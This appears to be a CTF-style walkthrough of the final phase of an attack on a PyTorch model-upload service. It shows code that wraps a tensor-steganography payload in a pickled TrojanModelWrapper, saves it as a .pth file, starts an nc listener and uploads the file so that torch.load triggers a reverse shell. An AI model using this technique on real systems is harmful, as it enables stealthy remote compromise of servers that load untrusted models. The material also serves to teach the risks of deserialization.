````markdown
# Executing the Attack: From Trojan Wrapper to Reverse Shell

This section describes the **final phase of the attack**, where the maliciously crafted model file is delivered to the target, triggering the reverse shell payload hidden via tensor steganography.

---

## 1. Creating the Trojan Wrapper Instance

To prepare the attack artifact:

1. Instantiate the **TrojanModelWrapper** class.
2. Pass the following to the constructor:
   - `modified_state_dict` – the model containing the embedded payload.
   - `target_key` – the tensor key where the payload is hidden (e.g., `"large_layer.weight"`).
   - `NUM_LSB` – the number of least significant bits used during embedding.

```python
wrapper_instance = TrojanModelWrapper(
    modified_state_dict=modified_state_dict,
    target_key=target_key,
    num_lsb=NUM_LSB,
)
````

* The wrapper **internally pickles the state_dict** and stores it.
* This object becomes the final malicious model.

---

## 2. Saving the Malicious Model

* Save the wrapper instance using `torch.save()` to produce the **malicious artifact**:

```python
final_malicious_file = "malicious_trojan_model.pth"
torch.save(wrapper_instance, final_malicious_file)
```

* Resulting file contains:

  * The pickled TrojanModelWrapper.
  * Embedded tensor with hidden payload.
  * Loader code ready to execute upon deserialization.

---

## 3. Preparing for Payload Execution

### Listener Setup

* Verify `HOST_IP` is set to the attacker-controlled machine reachable from the target.
* Start a network listener to catch the reverse shell:

```bash
nc -lvnp 4444
```

### File Upload

* Upload the malicious model file to the target using the application’s `/upload` endpoint.
* Python `requests` script example:

```python
import requests, os

api_url = "http://localhost:5555/upload"
pickle_file_path = final_malicious_file

files_to_upload = {
    "model": (os.path.basename(pickle_file_path), open(pickle_file_path, "rb"), "application/octet-stream")
}

response = requests.post(api_url, files=files_to_upload)
print(response.status_code, response.text)
```

* Ensure:

  1. API URL is correct.
  2. Target instance is running and network-accessible.
  3. Listener is active to receive the reverse shell connection.

---

## 4. Triggering the Payload

1. Upon receiving the uploaded file, the server calls:

```python
torch.load("malicious_trojan_model.pth")
```

2. `pickle` invokes the **TrojanModelWrapper.**reduce**()** method.
3. Loader code within the wrapper executes:

   * Reconstructs the state_dict.
   * Extracts the payload from the target tensor using `decode_lsb`.
   * Decodes payload bytes to Python code.
   * Executes the reverse shell.

---

## 5. Establishing a Reverse Shell

* If all steps succeed:

  * The listener (`nc`) receives a **shell connection** from the target.
  * Attacker can interact with the system:

```bash
# Example: retrieve a flag from the target
cat /app/flag.txt
```

---

## 6. Key Points in Execution

* **Self-contained Attack**: The malicious model file contains everything needed to execute the reverse shell.
* **Stealth**: The payload is hidden inside tensor weights, minimizing visible modifications.
* **Automatic Trigger**: Execution happens during normal model loading with `torch.load()`.
* **Controlled Delivery**: Upload endpoint is used as the vector to deliver the trojaned model.

---

## 7. Attack Flow Summary

```text
[Create Trojan Wrapper Instance] --> [Save as malicious .pth file]
      |
      v
[Verify HOST_IP & Start Listener] --> [Upload file via /upload endpoint]
      |
      v
[Server loads model with torch.load()] --> [__reduce__ triggers loader code]
      |
      v
[Decode payload from tensor] --> [Execute reverse shell] --> [Attacker gains system access]
```

* Successful execution results in **interactive command-line access** to the target machine, completing the attack chain.

```
```
